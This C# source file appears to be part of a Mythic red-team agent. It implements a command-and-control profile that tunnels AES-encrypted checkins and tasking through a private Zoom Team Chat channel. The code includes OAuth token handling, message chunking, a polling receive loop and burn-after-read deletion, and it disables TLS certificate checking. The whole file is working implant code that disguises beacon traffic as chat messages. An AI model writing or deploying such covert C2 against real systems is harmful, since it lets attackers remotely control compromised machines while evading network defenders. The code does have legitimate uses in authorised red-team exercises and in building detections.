using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Net;
using System.Net.Http.Headers;
using System.Net.Security;
using System.Text.Json;

namespace Agent.Profiles
{
    // Zoom Team Chat C2 profile.
    //
    // Uses the Zoom Team Chat REST API (Server-to-Server OAuth) as a duplex
    // message bus over a single private channel. The agent posts AES-encrypted
    // checkin/get_tasking payloads to the channel as chunked JSON envelopes
    // (t = "O"); the Mythic-side "zoom" C2 profile polls the channel, relays
    // complete blobs to Mythic, and posts the encrypted responses back
    // (t = "I", addressed to this agent's correlation id). A background receive
    // loop consumes the responses.
    //
    // Crypto is end-to-end between the agent and Mythic via ICryptoManager; the
    // wire only ever carries opaque base64.
    public class ZoomProfile : IProfile
    {
        public IAgentConfig agentConfig { get; set; }
        public ICryptoManager crypt { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }

        // ---- C2 parameters (substituted at build time by builder.buildZoom) ----
        private string accountId = "account_id";
        private string clientId = "client_id";
        private string clientSecret = "client_secret";
        private string userId = "user_id";
        private string channelId = "channel_id";
        private string apiBase = "api_base";
        private string oauthBase = "oauth_base";

        // ---- wire protocol constants ----
        private const string DIR_AGENT_TO_SERVER = "O";   // consumed by the Mythic bridge
        private const string DIR_SERVER_TO_AGENT = "I";   // produced by the Mythic bridge
        private const int CHUNK_SIZE = 3000;              // base64 chars per chat message (< 4096 limit)
        private const int RECEIVE_POLL_MS = 3000;         // background receiver poll interval
        private const int CHECKIN_WAIT_MS = 60000;        // how long to wait for the checkin response

        // ---- runtime state ----
        private readonly string _correlationId = Guid.NewGuid().ToString();
        private HttpClient _client { get; set; }
        private string _token = string.Empty;
        private DateTime _tokenExpiry = DateTime.MinValue;

        private CancellationTokenSource cancellationTokenSource { get; set; } = new();
        private readonly ManualResetEventSlim _checkinAvailable = new(false);
        private volatile bool _checkedIn = false;
        private CheckinResponse _checkinResponse = new();
        private readonly HashSet<string> _processedJobs = new();
        private int _receiverStarted = 0;
        private int currentAttempt = 0;
        private int maxAttempts = 10;

        public event EventHandler<TaskingReceivedArgs>? SetTaskingReceived;

        public ZoomProfile(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
        {
            this.agentConfig = config;
            this.crypt = crypto;
            this.logger = logger;
            this.messageManager = messageManager;

            HttpClientHandler handler = new HttpClientHandler();
            //Might need to make this configurable
            ServicePointManager.ServerCertificateValidationCallback =
                   new RemoteCertificateValidationCallback(
                       delegate
                       { return true; }
                   );
            this._client = new HttpClient(handler);
            this._client.Timeout = TimeSpan.FromSeconds(30);
        }

        // ===================== Zoom REST API =====================

        private async Task<string> GetToken()
        {
            // Zoom S2S tokens last ~1h; refresh ~5 min before expiry.
            if (!string.IsNullOrEmpty(_token) && DateTime.UtcNow < _tokenExpiry.AddMinutes(-5))
            {
                return _token;
            }
            string basic = Convert.ToBase64String(System.Text.Encoding.ASCII.GetBytes($"{clientId}:{clientSecret}"));
            string url = $"{oauthBase.TrimEnd('/')}/token";
            using HttpRequestMessage req = new HttpRequestMessage(HttpMethod.Post, url);
            req.Headers.Authorization = new AuthenticationHeaderValue("Basic", basic);
            req.Content = new FormUrlEncodedContent(new Dictionary<string, string>
            {
                { "grant_type", "account_credentials" },
                { "account_id", accountId },
            });
            using HttpResponseMessage resp = await _client.SendAsync(req);
            string body = await resp.Content.ReadAsStringAsync();
            if (!resp.IsSuccessStatusCode)
            {
                throw new Exception($"Zoom OAuth failed: {(int)resp.StatusCode} {body}");
            }
            using JsonDocument doc = JsonDocument.Parse(body);
            _token = doc.RootElement.GetProperty("access_token").GetString() ?? string.Empty;
            int expiresIn = doc.RootElement.TryGetProperty("expires_in", out var exp) ? exp.GetInt32() : 3600;
            _tokenExpiry = DateTime.UtcNow.AddSeconds(expiresIn);
            return _token;
        }

        private async Task<string?> SendChatMessage(string text)
        {
            string token = await GetToken();
            string url = $"{apiBase.TrimEnd('/')}/chat/users/{userId}/messages";
            using HttpRequestMessage req = new HttpRequestMessage(HttpMethod.Post, url);
            req.Headers.Authorization = new AuthenticationHeaderValue("Bearer", token);
            req.Content = new StringContent(
                JsonSerializer.Serialize(new { message = text, to_channel = channelId }),
                System.Text.Encoding.UTF8,
                "application/json");
            using HttpResponseMessage resp = await _client.SendAsync(req);
            if (!resp.IsSuccessStatusCode)
            {
                return null;
            }
            string body = await resp.Content.ReadAsStringAsync();
            try
            {
                using JsonDocument doc = JsonDocument.Parse(body);
                return doc.RootElement.TryGetProperty("id", out var idEl) ? idEl.GetString() : null;
            }
            catch
            {
                return null;
            }
        }

        private async Task<List<ZoomChatMessage>> ListChatMessages()
        {
            List<ZoomChatMessage> result = new();
            string token = await GetToken();
            string url = $"{apiBase.TrimEnd('/')}/chat/channels/{channelId}/messages?page_size=50";
            using HttpRequestMessage req = new HttpRequestMessage(HttpMethod.Get, url);
            req.Headers.Authorization = new AuthenticationHeaderValue("Bearer", token);
            using HttpResponseMessage resp = await _client.SendAsync(req);
            if (!resp.IsSuccessStatusCode)
            {
                return result;
            }
            string body = await resp.Content.ReadAsStringAsync();
            try
            {
                using JsonDocument doc = JsonDocument.Parse(body);
                if (doc.RootElement.TryGetProperty("messages", out var msgs))
                {
                    foreach (var m in msgs.EnumerateArray())
                    {
                        result.Add(new ZoomChatMessage
                        {
                            id = m.TryGetProperty("id", out var idEl) ? idEl.GetString() ?? "" : "",
                            message = m.TryGetProperty("message", out var msgEl) ? msgEl.GetString() ?? "" : "",
                        });
                    }
                }
            }
            catch
            {
            }
            return result;
        }

        private async Task DeleteChatMessage(string id)
        {
            try
            {
                string token = await GetToken();
                string url = $"{apiBase.TrimEnd('/')}/chat/users/{userId}/messages/{id}";
                using HttpRequestMessage req = new HttpRequestMessage(HttpMethod.Delete, url);
                req.Headers.Authorization = new AuthenticationHeaderValue("Bearer", token);
                using HttpResponseMessage resp = await _client.SendAsync(req);
            }
            catch
            {
            }
        }

        // ===================== Envelope / chunking =====================

        private static List<string> Chunk(string s)
        {
            List<string> chunks = new();
            if (string.IsNullOrEmpty(s))
            {
                chunks.Add("");
                return chunks;
            }
            for (int i = 0; i < s.Length; i += CHUNK_SIZE)
            {
                chunks.Add(s.Substring(i, Math.Min(CHUNK_SIZE, s.Length - i)));
            }
            return chunks;
        }

        // Posts an encrypted blob to the channel as one or more chunked envelopes
        // addressed from this agent (correlation id) to Mythic.
        private async Task PostEncrypted(string direction, string encrypted)
        {
            string job = Guid.NewGuid().ToString();
            List<string> chunks = Chunk(encrypted);
            for (int seq = 0; seq < chunks.Count; seq++)
            {
                string envelope = JsonSerializer.Serialize(new ZoomEnvelope
                {
                    t = direction,
                    c = _correlationId,
                    j = job,
                    s = seq,
                    n = chunks.Count,
                    d = chunks[seq],
                });
                await SendChatMessage(envelope);
            }
        }

        private static bool TryParseEnvelope(string text, out ZoomEnvelope env)
        {
            env = new ZoomEnvelope();
            if (string.IsNullOrEmpty(text) || !text.TrimStart().StartsWith("{"))
                return false;
            try
            {
                env = JsonSerializer.Deserialize<ZoomEnvelope>(text) ?? new ZoomEnvelope();
                return env.t == DIR_AGENT_TO_SERVER || env.t == DIR_SERVER_TO_AGENT;
            }
            catch
            {
                env = new ZoomEnvelope();
                return false;
            }
        }

        // ===================== Receive loop =====================

        private void EnsureReceiver()
        {
            if (Interlocked.CompareExchange(ref _receiverStarted, 1, 0) == 0)
            {
                _ = Task.Run(ReceiveLoop);
            }
        }

        private async Task ReceiveLoop()
        {
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                try
                {
                    await ProcessInbound();
                }
                catch
                {
                }
                try
                {
                    await Task.Delay(RECEIVE_POLL_MS, cancellationTokenSource.Token);
                }
                catch
                {
                    return;
                }
            }
        }

        private async Task ProcessInbound()
        {
            List<ZoomChatMessage> messages = await ListChatMessages();
            // Group SERVER_TO_AGENT envelopes addressed to us, by job id.
            Dictionary<string, JobBucket> jobs = new();
            foreach (var msg in messages)
            {
                if (!TryParseEnvelope(msg.message, out ZoomEnvelope env))
                    continue;
                if (env.t != DIR_SERVER_TO_AGENT || env.c != _correlationId || env.j == null)
                    continue;
                if (!jobs.TryGetValue(env.j, out JobBucket? bucket))
                {
                    bucket = new JobBucket { total = env.n };
                    jobs[env.j] = bucket;
                }
                bucket.chunks[env.s] = env.d ?? "";
                bucket.ids.Add(msg.id);
            }

            foreach (var kv in jobs)
            {
                string job = kv.Key;
                JobBucket bucket = kv.Value;
                if (_processedJobs.Contains(job))
                    continue;
                if (bucket.chunks.Count != bucket.total)
                    continue;

                _processedJobs.Add(job);
                string encrypted = string.Concat(Enumerable.Range(0, bucket.total).Select(i => bucket.chunks[i]));

                // burn-after-read
                foreach (string id in bucket.ids)
                {
                    await DeleteChatMessage(id);
                }

                string plain = crypt.Decrypt(encrypted);
                if (string.IsNullOrEmpty(plain))
                    continue;

                if (!_checkedIn)
                {
                    _checkinResponse = JsonSerializer.Deserialize(plain, CheckinResponseJsonContext.Default.CheckinResponse) ?? new CheckinResponse();
                    _checkinAvailable.Set();
                    _checkedIn = true;
                }
                else
                {
                    GetTaskingResponse? gtr = JsonSerializer.Deserialize(plain, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                    if (gtr != null)
                    {
                        TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
                        this.SetTaskingReceived?.Invoke(this, tra);
                    }
                }
            }

            // Keep the processed set bounded.
            if (_processedJobs.Count > 1000)
            {
                _processedJobs.Clear();
            }
        }

        // ===================== IProfile =====================

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            EnsureReceiver();

            string encrypted = crypt.Encrypt(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
            try
            {
                await PostEncrypted(DIR_AGENT_TO_SERVER, encrypted);
            }
            catch
            {
                return new CheckinResponse() { status = "failed" };
            }

            // Wait for the bridge to relay and return a checkin response.
            if (!_checkinAvailable.Wait(CHECKIN_WAIT_MS))
            {
                return new CheckinResponse() { status = "failed" };
            }
            return _checkinResponse;
        }

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            this.cancellationTokenSource = new CancellationTokenSource();
            EnsureReceiver();

            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);
                try
                {
                    // Solicit tasking every tick. GetAgentResponseString() returns a
                    // valid get_tasking even when there are no queued responses.
                    string encrypted = crypt.Encrypt(messageManager.GetAgentResponseString());
                    await PostEncrypted(DIR_AGENT_TO_SERVER, encrypted);
                    this.currentAttempt = 0;
                }
                catch (Exception)
                {
                    this.currentAttempt++;
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                }
            }
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }

        // ===================== Helpers =====================

        private class ZoomEnvelope
        {
            public string? t { get; set; }
            public string? c { get; set; }
            public string? j { get; set; }
            public int s { get; set; }
            public int n { get; set; }
            public string? d { get; set; }
        }

        private class ZoomChatMessage
        {
            public string id { get; set; } = string.Empty;
            public string message { get; set; } = string.Empty;
        }

        private class JobBucket
        {
            public int total;
            public Dictionary<int, string> chunks = new();
            public List<string> ids = new();
        }
    }
}
